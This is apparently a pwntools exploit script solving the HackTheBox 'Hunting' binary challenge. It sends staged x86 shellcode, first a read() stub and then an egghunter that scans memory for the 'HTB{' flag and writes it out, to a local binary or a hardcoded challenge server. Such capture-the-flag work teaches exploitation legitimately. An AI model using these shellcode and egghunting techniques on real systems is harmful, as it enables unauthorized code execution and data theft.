#!usr/bin/python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './hunting'
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'info'
host, port = '159.65.26.210', 31901

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
# reference and further explanation: https://d4mianwayne.github.io/2021/02/13/hunting/
# manual shellcode egghunting without shellcraft: https://github.com/luisrodrigues154/Cyber-Security/blob/master/HackTheBox/Challenges/Pwn/Hunting/notes.md
def exploit():
    io = initialize()

    # read(fd, &addr, count) -> (ebx, ecx, edx) -> (0, &mmap, 0xff)
    shellcode = asm('''
                    xor ebx, ebx;
                    mov edx, 0xff;
                    mov eax, 0x3;
                    int 0x80;
                    ''')
    io.send(shellcode)
    
    # cyclic from EIP after the above read()
    offset = 40
    shellcode = asm(shellcraft.egghunter(b"HTB{", 0x50000000))
    shellcode += asm(shellcraft.write(1, "ebx", 0x24))
    payload = flat({offset: shellcode})
    io.send(payload)
    
    flag = io.recv(0x24)
    info('FLAG: %s', flag)
    
    io.interactive()
    
if __name__ == '__main__':
    exploit()